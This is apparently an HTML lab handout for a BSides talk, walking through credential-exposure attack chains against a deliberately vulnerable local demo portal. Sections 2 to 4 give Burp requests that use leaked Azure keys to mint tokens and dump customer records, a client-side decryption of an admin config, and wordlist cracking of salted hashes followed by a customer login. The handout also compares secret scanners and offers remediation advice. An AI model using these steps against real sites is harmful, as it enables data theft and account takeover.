@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>InsecureShield — Reproduce the BSides Talk at Home</title>
+<style>
+  @page {
+    size: Letter;
+    margin: 0.6in 0.55in 0.7in 0.55in;
+    @bottom-left {
+      content: "Secrets That Survive Everything  ·  BSides Buffalo 2026  ·  @secretsifter";
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 8.5pt;
+      color: #6B7280;
+    }
+    @bottom-right {
+      content: "Page " counter(page) " / " counter(pages);
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 8.5pt;
+      color: #6B7280;
+    }
+  }
+  body {
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 10pt;
+    line-height: 1.42;
+    color: #1F2937;
+    margin: 0;
+  }
+  h1 {
+    font-size: 22pt;
+    margin: 0 0 4px 0;
+    color: #0F172A;
+    letter-spacing: -0.5px;
+  }
+  h1 .accent { color: #F97316; }
+  .subtitle {
+    font-size: 11pt;
+    color: #6B7280;
+    margin: 0 0 16px 0;
+  }
+  .meta-strip {
+    display: flex;
+    justify-content: space-between;
+    border-top: 2px solid #F97316;
+    border-bottom: 1px solid #E5E7EB;
+    padding: 6px 0;
+    margin-bottom: 18px;
+    font-size: 8.5pt;
+    color: #6B7280;
+  }
+  .meta-strip strong { color: #1F2937; }
+
+  h2 {
+    font-size: 14pt;
+    color: #0F172A;
+    margin: 24px 0 6px 0;
+    padding-bottom: 4px;
+    border-bottom: 1px solid #E5E7EB;
+    page-break-after: avoid;
+  }
+  h2 .num {
+    display: inline-block;
+    width: 26px;
+    height: 26px;
+    line-height: 26px;
+    text-align: center;
+    background: #F97316;
+    color: white;
+    font-size: 10.5pt;
+    border-radius: 4px;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+  h3 {
+    font-size: 11.5pt;
+    color: #DC2626;
+    margin: 14px 0 4px 0;
+    page-break-after: avoid;
+  }
+  h3 .step {
+    display: inline-block;
+    background: #FEE2E2;
+    color: #DC2626;
+    font-weight: bold;
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 9pt;
+    margin-right: 6px;
+  }
+  p { margin: 4px 0 6px 0; }
+  ul, ol { margin: 4px 0 8px 18px; padding: 0; }
+  li { margin-bottom: 2px; }
+  code {
+    font-family: "Menlo", "Monaco", "Courier New", monospace;
+    font-size: 9pt;
+    background: #F3F4F6;
+    padding: 1px 4px;
+    border-radius: 2px;
+    color: #DC2626;
+  }
+  pre {
+    font-family: "Menlo", "Monaco", "Courier New", monospace;
+    font-size: 8.5pt;
+    background: #0F172A;
+    color: #E5E7EB;
+    padding: 8px 10px;
+    border-radius: 4px;
+    overflow-x: auto;          /* horizontal scroll for very long lines on screen */
+    white-space: pre-wrap;     /* wrap long blobs and curls when there's room */
+    word-break: break-all;     /* never let a single token blow past the column */
+    margin: 6px 0;
+    line-height: 1.35;
+  }
+  @media print {
+    pre { overflow: hidden; white-space: pre; word-break: normal; font-size: 8pt; }
+  }
+  @media screen {
+    body { max-width: 980px; margin: 24px auto; padding: 0 18px; font-size: 11pt; }
+    pre { font-size: 10pt; }
+  }
+  pre code { background: transparent; color: inherit; padding: 0; }
+
+  .callouts {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 6px;
+    margin: 6px 0 8px 0;
+  }
+  .callout {
+    border-left: 3px solid;
+    padding: 5px 8px;
+    background: #F9FAFB;
+    font-size: 9pt;
+  }
+  .callout.find    { border-color: #2563EB; }
+  .callout.why     { border-color: #F97316; }
+  .callout.notool  { border-color: #6B7280; }
+  .callout.tool    { border-color: #22C55E; }
+  .callout strong { display: block; font-size: 8.5pt; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
+  .callout.find    strong { color: #2563EB; }
+  .callout.why     strong { color: #F97316; }
+  .callout.notool  strong { color: #6B7280; }
+  .callout.tool    strong { color: #22C55E; }
+
+  .warn-box {
+    border: 1px solid #F97316;
+    background: #FFF7ED;
+    padding: 8px 12px;
+    border-radius: 4px;
+    margin: 10px 0;
+    font-size: 9pt;
+  }
+  .warn-box strong { color: #C2410C; }
+
+  .quick-nav {
+    background: #F3F4F6;
+    border-radius: 4px;
+    padding: 8px 12px;
+    margin: 10px 0 18px 0;
+    font-size: 9pt;
+  }
+  .quick-nav strong { color: #0F172A; display: block; margin-bottom: 4px; }
+
+  .footer-resources {
+    margin-top: 22px;
+    padding-top: 10px;
+    border-top: 2px solid #F97316;
+    font-size: 9pt;
+  }
+  .footer-resources h3 { color: #0F172A; margin: 0 0 6px 0; }
+  .footer-resources ul { list-style: none; margin: 0; padding: 0; }
+  .footer-resources li { margin-bottom: 3px; }
+  .footer-resources strong { color: #1F2937; }
+  .footer-resources code { font-size: 8.5pt; color: #1F2937; background: #F9FAFB; }
+
+  .table-comparison {
+    border-collapse: collapse;
+    width: 100%;
+    margin: 8px 0;
+    font-size: 9pt;
+  }
+  .table-comparison th, .table-comparison td {
+    border: 1px solid #E5E7EB;
+    padding: 5px 8px;
+    text-align: left;
+  }
+  .table-comparison th {
+    background: #F3F4F6;
+    color: #0F172A;
+    font-weight: bold;
+  }
+  .table-comparison .count {
+    text-align: right;
+    font-family: "Menlo", "Monaco", monospace;
+    font-weight: bold;
+  }
+  .table-comparison .winner { background: #FFF7ED; }
+
+  .pagebreak { page-break-before: always; }
+
+  .closing {
+    margin-top: 18px;
+    padding: 10px 14px;
+    background: #0F172A;
+    color: #E5E7EB;
+    border-radius: 4px;
+    font-size: 10pt;
+  }
+  .closing strong { color: #F97316; }
+</style>
+</head>
+<body>
+
+<h1>InsecureShield — Reproduce the Talk at Home <span class="accent">↻</span></h1>
+<p class="subtitle">A step-by-step walkthrough of three production-grade credential exposure chains.<br>
+30 minutes from clone to "I saw it with my own eyes."</p>
+
+<div class="meta-strip">
+  <span><strong>Talk:</strong> Secrets That Survive Everything · <strong>Speaker:</strong> Hemanth Gorijala</span>
+  <span><strong>Repo:</strong> github.com/secretsifter/insecureshield-demo</span>
+</div>
+
+<div class="warn-box">
+  <strong>Safety note.</strong> All credentials in InsecureShield are <em>synthetic</em> — pattern-valid but no working external service stands behind them. The portal also has its own local backend that mimics the Azure APIM token-exchange flow, so every chain replays end-to-end against <code>localhost:3000</code> with zero external dependencies. Treat it like a CTF target on a private network. Do not deploy it to a public host.
+</div>
+
+<div class="quick-nav">
+  <strong>What you'll do in the next 30 minutes</strong>
+  ① Clone and run InsecureShield (5 min) ·
+  ② Chain 1 — Azure AD credentials in <code>main.js</code> → 4,999 customer records (10 min) ·
+  ③ Chain 2 — encrypted blob decrypted with <code>decrypt.py</code> → superadmin token → DB connection string (8 min) ·
+  ④ Chain 3 — captured password hash cracked with <code>crack.py</code> → log in as the customer (7 min)
+</div>
+
+<!-- =========================== SECTION 1 ============================ -->
+
+<h2><span class="num">1</span>Setup — 5 minutes</h2>
+
+<p><strong>Prerequisites:</strong> Node.js 18+ and npm. A modern browser with DevTools (Chrome / Firefox / Safari). Optional but recommended: Burp Suite Community Edition for the live-replay segments.</p>
+
+<pre>git clone https://github.com/secretsifter/insecureshield-demo.git
+cd insecureshield-demo
+npm install
+npm start</pre>
+
+<p>The app listens on <code>http://localhost:3000</code>. Open the URL — you should see the "InsecureShield Client Portal" login page.</p>
+
+<p>The demo ships with three small helper scripts at the project root — you'll use them in chains 2 and 3:</p>
+
+<ul>
+  <li><code>decrypt.py</code> — reverses the CryptoJS-encrypted blob in <code>main.js</code> using the openssl binary already on every Mac/Linux</li>
+  <li><code>crack.py</code> — reverses a captured <code>SHA-256(password+salt)</code> hash by trying every entry in <code>wordlist.txt</code></li>
+  <li><code>wordlist.txt</code> — 51 realistic common passwords (the same kind a pentester would try first)</li>
+</ul>
+
+<p>No <code>pip install</code> required for either script — both run on stock Python 3.</p>
+
+<!-- =========================== SECTION 2 ============================ -->
+
+<h2><span class="num">2</span>Chain 1 — Azure AD credentials in JavaScript</h2>
+
+<p>This is the chain that started the talk. Two bug-bounty reports flagged "hardcoded credentials" and stopped there. The question that wouldn't go away: <em>what do they actually unlock?</em></p>
+
+<h3><span class="step">2.1</span>The HTML-comment leak</h3>
+<p><strong>Action:</strong> right-click anywhere on the login page → <strong>View Page Source</strong>. Or open <code>view-source:http://localhost:3000/</code>.</p>
+
+<p>Scroll to the top of the HTML. You'll see comments that look like a TODO note from a developer:</p>
+
+<pre>&lt;!-- Internal API config — TODO: move to vault before prod release
+     api_gateway_url:       https://acme-portal-api.azure-api.net/v2
+     apim-subscription-key: a1b2c3d4e5f6789012345678901234ab
+     dev_admin:             admin@acme-portal.com / InsecureShield@2024
+     db_conn:                Server=prod-db.acme-portal.internal;Database=AcmePortalDB;User Id=sa;Pas...
+--&gt;</pre>
+
+<div class="callouts">
+  <div class="callout find"><strong>What you'll find</strong>API gateway URL, APIM subscription key, dev admin credentials, prod DB connection string. All visible to anyone who right-clicks.</div>
+  <div class="callout why"><strong>Why it matters</strong>The comment says "TODO: move to vault before prod release" — which means it never happened. This is how secrets ship to production. The developer's intent didn't survive the deadline.</div>
+  <div class="callout notool"><strong>Without tools</strong>Browser DevTools, no JavaScript engagement required. Anyone with a right-click button finds this in seconds.</div>
+  <div class="callout tool"><strong>SecretSifter catches</strong>DB password, admin credentials, and APIM subscription key in the HTML response at <strong>HIGH</strong> severity, <strong>CERTAIN</strong> confidence.</div>
+</div>
+
+<h3><span class="step">2.2</span>The Azure AD application credentials in main.js</h3>
+<p><strong>Action:</strong> open <code>http://localhost:3000/js/main.js</code> directly in your browser. Search for <code>AZURE_AD_CONFIG</code>.</p>
+
+<pre>var AZURE_AD_CONFIG = {
+    tenantId:    "1a2b3c4d-5e6f-7890-abcd-ef1234567890",
+    appId:       "8f4e2d1c-9b3a-4f6e-8a7d-2c1b9e5f4a3d",
+    appKey:      "Ins~K3y.qX7vN9bM4dZ8mP2hT5wL1eC6rJ0aFgYi==",
+    resourceId:  "https://acme-portal-api.azure-api.net",
+    resourceKey: "R7vN3kQ9pX5tL2cD8fG6hJ1mB4sY0aW7eK3rT9zU1nM5oI8jH2vC6bF4yE7wQ0pA==",
+    authority:   "https://login.microsoftonline.com/1a2b3c4d-..."
+};
+
+var APIM_CONFIG = {
+    subscriptionKey: "a1b2c3d4e5f6789012345678901234ab",
+    ...
+};</pre>
+
+<div class="callouts">
+  <div class="callout find"><strong>What you'll find</strong>The complete OAuth2 <code>client_credentials</code> set: <code>appId</code> (client ID), <code>appKey</code> (client secret), <code>resourceKey</code> (target API access key), and the APIM <code>subscriptionKey</code> in the next config block.</div>
+  <div class="callout why"><strong>Why it matters</strong>These values authenticate as the <em>application identity</em>, not a user. Whoever downloads <code>main.js</code> can mint a Bearer token and call every API the application is permitted to call.</div>
+  <div class="callout notool"><strong>Without tools</strong>Search <code>main.js</code> in DevTools (<code>Cmd+F</code>) for "AZURE", "appKey", or "subscription". The file header reads "Generated by build pipeline" — confirming it wasn't committed to source.</div>
+  <div class="callout tool"><strong>SecretSifter catches</strong>All values labeled by their developer-given names: <code>appKey</code>, <code>resourceKey</code>, <code>subscriptionKey</code>. Plus <code>tenantId</code> and <code>appId</code> at INFO severity.</div>
+</div>
+
+<h3><span class="step">2.3</span>Mint an access token — Burp Repeater</h3>
+
+<p>The portal's local backend mimics the Azure APIM token-exchange flow. POST the three Azure AD values as headers, the server returns a real Bearer token plus an echoed <code>resource_key</code>.</p>
+
+<pre>POST /api/auth/generate-token HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+appId:        8f4e2d1c-9b3a-4f6e-8a7d-2c1b9e5f4a3d
+appKey:       Ins~K3y.qX7vN9bM4dZ8mP2hT5wL1eC6rJ0aFgYi==
+resourceKey:  R7vN3kQ9pX5tL2cD8fG6hJ1mB4sY0aW7eK3rT9zU1nM5oI8jH2vC6bF4yE7wQ0pA==
+
+{}</pre>
+
+<p><strong>Expected response (200 OK):</strong></p>
+
+<pre>{
+  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....",
+  "resource_key": "R7vN3kQ9pX5tL2cD8fG6hJ1mB4sY0aW7eK3rT9zU1nM5oI8jH2vC6bF4yE7wQ0pA==",
+  "token_type":   "Bearer",
+  "expires_in":   14400,
+  "scope":        "policies.read claims.read users.read"
+}</pre>
+
+<p>Notice the <code>resource_key</code> echo — a second copy of a secret crosses the wire <em>in the response body</em>. Burp's SecretSifter response scanner picks that up as a separate finding.</p>
+
+<h3><span class="step">2.4</span>Use the token + subscription key — exfiltrate the customer table</h3>
+
+<p>The data APIs require <em>both</em> the Bearer token (issued in 2.3) AND the APIM <code>Ocp-Apim-Subscription-Key</code> header — same as a real Azure APIM gateway. Stage a second Repeater tab:</p>
+
+<pre>GET /api/users HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<p><strong>Expected response:</strong> 4,999 customer records. For each customer: <code>id</code>, <code>name</code>, <code>email</code>, <code>dob</code>, <code>phone</code>, <code>ssn</code>, <code>address</code>, plus a <code>passwordHash</code> and <code>salt</code> (Chain 3 uses these).</p>
+
+<p><strong>Quick negative check.</strong> Drop either header and resend — the server returns <strong>401</strong> in both cases. That's the gateway requiring both credentials to be valid.</p>
+
+<h3><span class="step">2.5</span>Land the Chain 1 punchline — <code>/api/stats</code></h3>
+
+<pre>GET /api/stats HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGc...
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "totalCustomers": 4999,
+  "totalPolicies":  26,
+  "totalClaims":    15,
+  "openClaims":     3,
+  "totalExposure":  417350
+}</pre>
+
+<div class="callout why"><strong>Punchline read aloud:</strong> "<em>$417,350 in claims exposure across 4,999 customers — from a key the JavaScript handed me.</em>"</div>
+
+<!-- =========================== SECTION 3 ============================ -->
+
+<div class="pagebreak"></div>
+
+<h2><span class="num">3</span>Chain 2 — Client-side encryption is not protection</h2>
+
+<p>A developer "knows credentials in JavaScript are bad" and encrypts the config blob. The question: <em>where does the decryption key live?</em> Spoiler — three lines below the ciphertext.</p>
+
+<h3><span class="step">3.1</span>Find the ciphertext and the key — three lines apart</h3>
+<p><strong>Action:</strong> still in <code>main.js</code>, search for <code>ENCRYPTED_SP_CONFIG</code>.</p>
+
+<pre>// line 40
+var ENCRYPTED_SP_CONFIG = "U2FsdGVkX1+SjyqRr+Wa5TUxIW5JIYPKVVHbdmtqoBoWKiMa4QMcf6rXQ/YFFKJfp...";
+
+// line 43
+var SP_CONFIG_KEY = "InsecureShield-Config-Key-2024Q4";
+
+// line 46-48 — decryption runs in the browser at page load
+var SECURE_SP = JSON.parse(
+    CryptoJS.AES.decrypt(ENCRYPTED_SP_CONFIG, SP_CONFIG_KEY).toString(CryptoJS.enc.Utf8)
+);</pre>
+
+<p>The prefix <code>U2FsdGVkX1+</code> is base64 of <code>Salted__</code> — the signature of a CryptoJS / OpenSSL "passphrase mode" blob. Recognizing that prefix on sight is a useful pentester skill.</p>
+
+<div class="callouts">
+  <div class="callout find"><strong>What you'll find</strong>The ciphertext, the key, and the decrypt call — all in the same file the browser already downloaded. The encryption protects nothing because the decryption runs client-side.</div>
+  <div class="callout why"><strong>Why it matters</strong>If the browser can decrypt it, the key has to be in the browser. This pattern shows up in real engagements every quarter — the developer's intent was reasonable, the threat model was wrong.</div>
+  <div class="callout notool"><strong>Without tools</strong>Open the InsecureShield page in your browser, open DevTools console, and type <code>window.APP_CONFIG.secureSp</code>. The page already decrypted it on load — you're just reading the result.</div>
+  <div class="callout tool"><strong>SecretSifter catches</strong><code>ENCRYPTED_SP_CONFIG</code> as a HIGH/FIRM finding — the encrypted blob itself is the evidence. No other tool in the comparison flags this pattern.</div>
+</div>
+
+<h3><span class="step">3.2</span>Reverse the blob with <code>decrypt.py</code> — one line</h3>
+
+<p>The demo ships a tiny Python helper at the project root. It wraps the system <code>openssl</code> binary (zero pip-install dependencies). Pipe the blob in on stdin:</p>
+
+<pre>echo 'U2FsdGVkX1+SjyqRr+Wa5TUxIW5JIYPKVVHbdmtqoBoWKiMa4QMcf6rXQ/YFFKJfp...' \
+  | python3 decrypt.py</pre>
+
+<p><strong>Expected output:</strong></p>
+
+<pre>{
+  "tenantId":    "7c1064ea-b8c7-402f-bb82-76aaccc91dc4",
+  "appId":       "9a8b7c6d-5e4f-3a2b-1c0d-ef9876543210",
+  "appKey":      "AdmIn~App.Q4-2024.7vR3xW5tY1uO4sD6jF~AcmePortal",
+  "resourceId":  "https://acme-portal-api.azure-api.net/admin",
+  "resourceKey": "AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==",
+  "authority":   "https://login.microsoftonline.com/7c1064ea-...",
+  "scope":       "admin.config.read admin.diagnostics admin.dbconn"
+}</pre>
+
+<div class="callout why"><strong>The reveal:</strong> a <em>second</em> Azure AD application registration was hidden in the blob — different <code>appId</code>, different <code>appKey</code>, different <code>resourceKey</code> from the public values in step 2.2. The "encryption" layer didn't protect a database connection string. It protected a more-privileged Azure app.</div>
+
+<h3><span class="step">3.3</span>Mint a SUPERADMIN token — same endpoint, different keys</h3>
+
+<p>The portal's <code>/api/auth/generate-token</code> endpoint accepts both credential sets. The public Azure AD creds (step 2.3) return a regular <code>admin</code> token. The <em>decrypted admin Azure AD creds</em> return a <strong>superadmin</strong> token with a different scope. Same endpoint, different role.</p>
+
+<pre>POST /api/auth/generate-token HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+appId:        9a8b7c6d-5e4f-3a2b-1c0d-ef9876543210
+appKey:       AdmIn~App.Q4-2024.7vR3xW5tY1uO4sD6jF~AcmePortal
+resourceKey:  AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==
+
+{}</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "access_token": "eyJhbGc....",   // role:superadmin, source:sp
+  "resource_key": "AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==",
+  "token_type":   "Bearer",
+  "expires_in":   14400,
+  "scope":        "admin.config.read admin.diagnostics admin.dbconn"
+}</pre>
+
+<h3><span class="step">3.4</span>Reach the admin endpoint the public token couldn't touch</h3>
+
+<p>The superadmin token + the same APIM subscription key now reaches endpoints that returned <strong>403</strong> with the public token in step 2:</p>
+
+<pre>GET /api/admin/internal-config HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer &lt;superadmin token&gt;
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "IsSuccess": true,
+  "config": {
+    "jwt_secret_fingerprint": "SHA256:84396fae75145477",
+    "db_conn_string":         "Server=prod-db.acme-portal.internal;Database=AcmePortalDB;User Id=sa;Password=X7!kP#9mQvLr3$nBs;",
+    "apim_subscription_key":  "a1b2c3d4e5f6789012345678901234ab",
+    "admin_email":            "admin@acme-portal.com",
+    "internal_services": [
+      "https://claims-svc.acme-portal.internal/api/v1",
+      "https://policy-svc.acme-portal.internal/api/v1",
+      "https://reporting.acme-portal.internal/api"
+    ]
+  }
+}</pre>
+
+<div class="callout why"><strong>Punchline read aloud:</strong> "<em>The 'encrypted' configuration hid an Azure admin app. That admin app unlocks the production database connection string — including the sa password. The encryption added one openssl call to the attack chain.</em>"</div>
+
+<!-- =========================== SECTION 4 ============================ -->
+
+<div class="pagebreak"></div>
+
+<h2><span class="num">4</span>Chain 3 — Crack a captured hash and log in as the customer</h2>
+
+<p>The <code>/api/users</code> response from step 2.4 didn't just leak names and emails. Every record carried a <code>passwordHash</code> and a <code>salt</code>. That makes the response a <em>credential dump</em> — and credential dumps fuel account takeover.</p>
+
+<h3><span class="step">4.1</span>The hashing scheme — discoverable from db.js</h3>
+
+<p>Open <code>data/db.js</code> in the cloned repo. The relevant lines:</p>
+
+<pre>const salt = crypto.createHash('md5').update(c.id + ':salt').digest('hex').slice(0, 16);
+const hash = crypto.createHash('sha256').update(c.password + salt).digest('hex').toUpperCase();</pre>
+
+<p>So the format is <code>SHA-256(password + salt)</code>, uppercase hex. A pentester would identify this from the hash shape alone (64 hex chars = 256 bits = SHA-256) and confirm by trying both <code>password+salt</code> and <code>salt+password</code>. Hashcat mode <code>1410</code> fits exactly.</p>
+
+<h3><span class="step">4.2</span>Reverse the hash with <code>crack.py</code> — one line</h3>
+
+<p>The companion <code>crack.py</code> reads <code>HASH:SALT</code> on stdin and tries every entry in <code>wordlist.txt</code> (51 realistic patterns: <code>password</code>, <code>Pass@1234</code>, <code>P@ssw0rd</code>, <code>Welcome2024</code>, …):</p>
+
+<pre>echo 'C123F6BF928BA0182E22850B0D3A56731620D94E493D1741F50BC66C0EFC0A91:cb590adac3c2f4af' \
+  | python3 crack.py</pre>
+
+<p><strong>Expected output</strong> (instant — under 100ms on any laptop):</p>
+
+<pre>C123F6BF928BA018…  →  Pass@1234</pre>
+
+<div class="callouts">
+  <div class="callout find"><strong>What you'll find</strong>The captured hash for James Mitchell (<code>CUST-001</code>) cracks to the plaintext password <code>Pass@1234</code>. Mass crack: pipe all 4,999 <code>HASH:SALT</code> pairs from the response and watch any password in the wordlist crack.</div>
+  <div class="callout why"><strong>Why it matters</strong>The hashing is technically "salted" — but salts only protect against rainbow tables, not against per-account dictionary attacks. A 51-line wordlist cracks every common password instantly. Real rockyou.txt has 14M entries.</div>
+  <div class="callout notool"><strong>Without tools</strong>Replace <code>crack.py</code> with three lines of Python and a wordlist. Or use hashcat <code>-m 1410</code> with rockyou.txt — the same flow, different tooling.</div>
+  <div class="callout tool"><strong>Mass crack one-liner</strong>Pipe the API response through <code>jq</code> to extract every hash+salt pair, then through <code>crack.py</code>:<br><code>curl … /api/users | jq -r '.users[] | "\(.passwordHash):\(.salt)"' | python3 crack.py</code></div>
+</div>
+
+<h3><span class="step">4.3</span>Log in as the customer — Burp Repeater</h3>
+
+<p>Cracking a hash is theoretical until you use the password. Stage one more Repeater request:</p>
+
+<pre>POST /api/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"email":"james.mitchell@gmail.com","password":"Pass@1234"}</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "IsSuccess":  true,
+  "token":     "eyJhbGc...",   // customer-scoped JWT
+  "role":      "customer",
+  "name":      "James Mitchell",
+  "customerId":"CUST-001"
+}</pre>
+
+<p>The portal just authenticated you as James Mitchell. With that customer JWT (+ the APIM subscription key) you can read his profile, his policies, his claims — anything the portal exposes for the account.</p>
+
+<div class="callout why"><strong>Punchline read aloud:</strong> "<em>From a leaked subscription key, to 4,999 hashed credentials, to a plaintext password in a 51-line wordlist, to logged in as the customer — in under two minutes. No phishing. No social engineering. Just the JavaScript file the browser downloaded.</em>"</div>
+
+<!-- =========================== SECTION 5 ============================ -->
+
+<div class="pagebreak"></div>
+
+<h2><span class="num">5</span>Additional credentials — where else they hide</h2>
+
+<p>The three chains aren't the only credentials in the bundle. InsecureShield scatters secrets across several files — each representing a different real-world delivery pattern. Walk these to build the muscle memory for production audits.</p>
+
+<h3><span class="step">5.1</span>/js/env.js — build-time env-var injection</h3>
+<p><strong>Pattern:</strong> Webpack <code>DefinePlugin</code> or <code>NEXT_PUBLIC_*</code> inlining. The developer wrote <code>process.env.STRIPE_SECRET_KEY</code>; the build replaced it with the literal string.</p>
+<p><strong>What you'll find:</strong> Stripe live key, SendGrid key, AWS access key + secret, Stripe webhook secret, Twilio auth token + account SID, <code>INTERNAL_API_KEY</code>, S3 bucket name. Every one of these visible in Burp's response pane on every page load.</p>
+
+<h3><span class="step">5.2</span>/js/firebase.js — Google Cloud service-account leak</h3>
+<p><strong>Pattern:</strong> Static config import. The developer literally pasted the Firebase service-account JSON into the client bundle.</p>
+<p><strong>What you'll find:</strong> Google API key, PEM RSA private key, <code>private_key_id</code>, Firebase database URL, service account email, Firebase <code>client_id</code>.</p>
+
+<h3><span class="step">5.3</span>/asset-manifest.json — manifest-file leak</h3>
+<p><strong>Pattern:</strong> The build pipeline emits a manifest of asset paths and config. Often overlooked by scanners that focus on <code>.js</code> files.</p>
+<p><strong>What you'll find:</strong> AWS region, S3 bucket name, redundant AWS access key + secret, additional API keys with custom prefixes. The manifest is served with a non-JS content type — many scanners skip it.</p>
+
+<!-- =========================== SECTION 6 ============================ -->
+
+<div class="pagebreak"></div>
+
+<h2><span class="num">6</span>Reproduce the 4-tool comparison</h2>
+
+<p>This is the segment that closes the talk. Same target. Same Burp proxy. Default rules each tool. Compare what each one finds.</p>
+
+<h3><span class="step">6.1</span>Run the four tools against InsecureShield</h3>
+
+<ul>
+  <li><strong>SecretSifter</strong> (Burp extension) — github.com/secretsifter/secretsifter-burp · BApp Store: pending</li>
+  <li><strong>Sensitive Discoverer</strong> (Burp extension) — BApp Store</li>
+  <li><strong>Titus / TruffleHog (Burp extensions)</strong> — both available on BApp Store</li>
+  <li><strong>TruffleHog (CLI)</strong> — <code>brew install trufflehog</code></li>
+</ul>
+
+<p>For each Burp extension: proxy InsecureShield through Burp, browse the login + dashboard pages, let the passive scanners run. For TruffleHog CLI: run <code>trufflehog filesystem ./dist</code> against the built artifact.</p>
+
+<h3><span class="step">6.2</span>What to expect</h3>
+
+<table class="table-comparison">
+  <tr><th>Tool</th><th class="count">Unique creds</th><th>Notable wins</th><th>Notable misses</th></tr>
+  <tr class="winner"><td><strong>SecretSifter</strong></td><td class="count">23</td><td>Encrypted CryptoJS blob · DB password in HTML comment · custom-labeled keys</td><td>AWS ARN (treated as identifier)</td></tr>
+  <tr><td>Sensitive Discoverer</td><td class="count">12 + 4 emails</td><td>AWS ARN · Firebase DB URL · PEM marker</td><td>Encrypted blob · DB password · APIM key · Twilio</td></tr>
+  <tr><td>Titus</td><td class="count">9</td><td>Azure APIM key · PEM key · AWS ARN · Mailgun</td><td>Encrypted blob · Stripe live · Twilio · custom labels</td></tr>
+  <tr><td>TruffleHog (Burp)</td><td class="count">8</td><td>APIM · Mailgun · Stripe · SendGrid · vendor patterns</td><td>Encrypted blob · PEM key · 4 mislabeled APIM matches</td></tr>
+</table>
+
+<p>The exact numbers may shift as tools update their detector rules. What stays consistent: no single tool catches everything, and the encrypted blob + the in-HTML DB credential are the two findings that distinguish runtime-aware detection from pattern-matching alone.</p>
+
+<!-- =========================== SECTION 7 ============================ -->
+
+<h2><span class="num">7</span>Add your own detection patterns</h2>
+
+<p>If you find a credential category that SecretSifter doesn't catch, the patterns are in <code>Patterns.java</code> in the <code>burp-secret-scanner</code> repo. Each pattern is a regex plus a severity, confidence, and label.</p>
+
+<pre>// Example pattern entry
+new Pattern(
+    "stripe_secret_key",            // label (shown to the user)
+    Pattern.compile("sk_live_[a-zA-Z0-9]{24,}"),
+    Severity.HIGH,
+    Confidence.CERTAIN,
+    "Stripe live secret key"
+);</pre>
+
+<p>Add a new pattern, run the test suite (<code>./gradlew test</code>), and submit a pull request. Patterns are reviewed against InsecureShield to confirm they don't introduce false positives. Detectors that catch real-world patterns the community hasn't formalized yet are the most welcome contributions.</p>
+
+<!-- =========================== SECTION 8 ============================ -->
+
+<h2><span class="num">8</span>What to do with what you found</h2>
+
+<p>If you're a <strong>pentester or bug-bounty hunter</strong>: don't stop at "credential exists." Walk the chain. Call the token endpoint. Enumerate what the service principal is permitted to do. The frontend code often documents the backend endpoints you can then call.</p>
+
+<p>If you're a <strong>developer</strong>: an environment variable in GitHub Secrets is protected; the same value, inlined into <code>main.bundle.js</code> by webpack, is on every device that loaded your site. The variable name didn't change. The trust model did. Use a secrets manager (Azure Key Vault, AWS Secrets Manager) for anything sensitive, and prefer the Backend-for-Frontend pattern so credentials never leave the server.</p>
+
+<p>If you're <strong>security leadership</strong>: add an artifact-scan stage to the pipeline. After the build produces the bundle, before deployment, scan the actual files the visitor will download. This is the closest thing to "shift-left for the runtime layer." Combine with runtime detection (browser extension, Burp extension, or proxy-based scanner) for the layer artifact scans don't reach (SSR state, runtime-fetched config, lazy chunks).</p>
+
+<div class="closing">
+  <strong>Bottom line.</strong> The runtime layer is the only layer every attacker always sees. It is also the only layer where no industry-mature automated tool combines all four required properties (black-box, runtime-observing, encrypted-blob detection, noise-suppressed). InsecureShield is a target you can practice against. SecretSifter is one attempt at filling the gap. The talk argues that the gap is structural — and structural gaps deserve structural answers.
+</div>
+
+<!-- =========================== RESOURCES ============================ -->
+
+<div class="footer-resources">
+  <h3>References</h3>
+  <ul>
+    <li><strong>Demo repo:</strong> <code>github.com/secretsifter/insecureshield-demo</code></li>
+    <li><strong>SecretSifter (Burp extension):</strong> <code>github.com/secretsifter/secretsifter-burp</code></li>
+    <li><strong>Browser extension:</strong> Chrome / Firefox stores · search "SecretSifter"</li>
+    <li><strong>Research preprint:</strong> <em>Secrets That Survive Everything</em> · DOI <code>10.5281/zenodo.19464446</code></li>
+    <li><strong>Conference:</strong> BSides Buffalo 2026 (June 6) · BSides SATX 2026 (June 13)</li>
+    <li><strong>Contact:</strong> @secretsifter on Bluesky · infosec.exchange</li>
+  </ul>
+</div>
+
+</body>
+</html>
